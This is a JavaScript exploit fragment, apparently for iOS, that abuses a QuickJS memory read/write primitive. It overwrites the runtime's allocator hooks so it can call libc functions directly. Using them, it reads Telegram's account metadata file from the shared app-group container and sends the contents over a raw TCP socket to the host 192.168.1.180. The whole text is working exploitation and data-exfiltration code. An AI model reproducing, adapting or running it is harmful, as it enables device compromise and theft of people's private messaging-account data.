/* ===== iOS 27 full DB exfil via QuickJS allocator hooks (no pivot) ===== */
  var MK = setres;
  function u64(x) { return BigInt.asUintN(64, x); }
  function rd32_(A) {
    var a = A & ~7n;
    var q = u64(RD(a));
    var sh = Number(A & 7n) * 8;
    return Number((q >> BigInt(sh)) & 0xffffffffn);
  }
  var base = 0n;
  if (CFG.JS_DEF_FREE) {
    base = u64(js_free - BigInt(CFG.JS_DEF_FREE));
    if ((rd32_(base) >>> 0) !== 0xfeedfacf) base = 0n;
  }
  if (base === 0n) { MK('H_NO_BASE'); return; }
  var libcFree = RD(js_free + 0x29ba084n);
  if (!codeok(libcFree)) { MK('H_NO_FREE'); return; }
  var OPEN = u64(libcFree + 0xb79b52bcn);
  var READ = u64(libcFree + 0xb79b4a44n);
  var WRITE = u64(libcFree + 0xb79b3b8cn);
  var SOCKET = u64(libcFree + 0xb79b3fb4n);
  var CONNECT = u64(libcFree + 0xb79b9998n);
  var CLOSE = u64(libcFree + 0xb79afe3cn);
  var USABLE0 = u64(base + 0x38f24n);

  var CHUNK = 4194304, CHUNK_B = 4194304n, RDBUF = 1048576;
  var RAB = new ArrayBuffer(4096, { maxByteLength: CHUNK });
  var UB = new Uint8Array(RAB);
  globalThis.__RABKEEP = [RAB, UB];
  for (var i0 = 0; i0 < 4096; i0++) UB[i0] = 0;
  var MAG = (BigInt((Math.random() * 0x100000000) >>> 0) << 32n) |
            BigInt((Math.random() * 0x100000000) >>> 0);
  if (MAG === 0n) MAG = 0x5a5a5a5a5a5a5a5an;
  for (var i1 = 0; i1 < 8; i1++) UB[0x800 + i1] = Number((MAG >> BigInt(8 * i1)) & 0xffn);
  var U = 0n, S = 0n, lim = 0x10000n, off;
  for (off = D; off < D + lim; off += 8n) {
    var w = RD(off);
    if ((w & 0xffffffffn) === 4096n) {
      var p = RD(off + 16n);
      var pq = p & 0x00ffffffffffffffn;
      if (pq > 0x10000n && pq < 0x0001000000000000n && (p & 7n) === 0n) {
        try { if (RD(p + 0x800n) === MAG) { U = p; S = off; break; } } catch (e) {}
      }
    }
  }
  if (U === 0n) {
    for (off = D - 8n; off > D - lim; off -= 8n) {
      var w2 = RD(off);
      if ((w2 & 0xffffffffn) === 4096n) {
        var p2 = RD(off + 16n);
        var pq2 = p2 & 0x00ffffffffffffffn;
        if (pq2 > 0x10000n && pq2 < 0x0001000000000000n && (p2 & 7n) === 0n) {
          try { if (RD(p2 + 0x800n) === MAG) { U = p2; S = off; break; } } catch (e) {}
        }
      }
    }
  }
  if (U === 0n) { MK('H_NF D=' + hex(D)); return; }

  RAB.resize(CHUNK);
  var U2 = RD(S + 16n);
  if (RD(U2 + 0x800n) !== MAG) { MK('H_BAD_U2'); return; }

  var S0 = S, S16 = S + 16n;
  var RT_REALLOC = rt + 24n, RT_USABLE = rt + 32n, RT_OPAQUE = rt + 64n;
  var REAL_REALLOC = RD(RT_REALLOC), REAL_USABLE = RD(RT_USABLE);

  var GRP = '/private/var/mobile/Containers/Shared/AppGroup/00000000-0000-0000-0000-000000000000/telegram-data';
  var META = GRP + '/accounts-metadata/atomic-state';
  var oMeta = 0, oPath = 0x200, oSock = 0x400, oRead = 0x1000;
  for (var i2 = 0; i2 < META.length; i2++) UB[oMeta + i2] = META.charCodeAt(i2) & 0xff;
  UB[oMeta + META.length] = 0;
  UB[oSock] = 16; UB[oSock + 1] = 2;
  UB[oSock + 2] = 0x11; UB[oSock + 3] = 0x66;
  UB[oSock + 4] = 192; UB[oSock + 5] = 168; UB[oSock + 6] = 1; UB[oSock + 7] = 180;

  function W8(A, V) { setR(A); Rb[0] = V; }
  function callHook(hook, x0, ptr, size) {
    W8(RT_REALLOC, hook);
    W8(RT_USABLE, USABLE0);
    W8(RT_OPAQUE, x0);
    W8(S16, ptr);
    W8(S0, CHUNK_B);
    try { RAB.resize(size); } catch (e) {}
    W8(RT_REALLOC, REAL_REALLOC);
    W8(RT_USABLE, REAL_USABLE);
    var ret = (RD(S0) === CHUNK_B) ? 0n : RD(S16);
    W8(S16, U2);
    W8(S0, CHUNK_B);
    return ret;
  }

  var fdMeta = callHook(OPEN, U2 + BigInt(oMeta), 0x200n, 1);
  if (fdMeta < 0n || fdMeta > 0xffffn) { MK('H_OM ' + hex(fdMeta)); return; }
  var nMeta = callHook(READ, fdMeta, U2 + BigInt(oRead), 16384);
  if (nMeta < 1n) { MK('H_RM ' + hex(nMeta)); return; }
  callHook(CLOSE, fdMeta, 1n, 1);
  var mn = Number(nMeta), meta = '';
  for (var i3 = 0; i3 < mn; i3 += 8) {
    var q = RD(U2 + BigInt(oRead + i3));
    for (var j3 = 0; j3 < 8 && i3 + j3 < mn; j3++) {
      meta += String.fromCharCode(Number((q >> BigInt(8 * j3)) & 0xffn));
    }
  }
  var js;
  try { js = JSON.parse(meta); } catch (e) { MK('H_JSON ' + mn); return; }
  if (!js || !js.currentRecordId) { MK('H_RID ' + mn); return; }
  var acc = BigInt.asUintN(64, BigInt(js.currentRecordId)).toString();

  var fdSock = callHook(SOCKET, 2n, 1n, 6);
  if (fdSock < 3n || fdSock > 0xffffn) { MK('M_SOCK ' + hex(fdSock)); return; }
  var cr = callHook(CONNECT, fdSock, U2 + BigInt(oSock), 16);
  if (cr < 0n) { MK('M_CONN ' + hex(cr)); return; }
  var w = callHook(WRITE, fdSock, U2 + BigInt(oRead), Number(nMeta));
  MK('M_OK ' + w + ' N=' + nMeta + ' A=' + acc);
  callHook(CLOSE, fdSock, 1n, 1);
